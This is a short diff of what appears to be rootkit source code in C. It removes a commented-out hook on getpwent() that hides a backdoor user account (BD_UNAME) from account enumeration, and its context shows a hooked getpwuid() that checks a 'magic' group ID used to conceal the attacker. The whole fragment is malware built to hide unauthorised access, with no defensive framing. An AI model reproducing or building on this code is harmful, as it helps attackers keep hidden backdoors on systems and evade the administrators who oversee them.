@@ -1,16 +1,3 @@
-/*struct passwd *getpwent(void){
-    hook(CGETPWENT);
-
-    struct passwd *tmp = call(CGETPWENT);
-    if(tmp && tmp->pw_name != NULL){
-        if(!strcmp(BD_UNAME, tmp->pw_name)){
-            errno = ESRCH;
-            tmp = NULL;
-        }
-    }
-    return tmp;
-}*/
-
 struct passwd *getpwuid(uid_t uid){
     hook(CGETPWUID);
     gid_t magicgid = readgid();
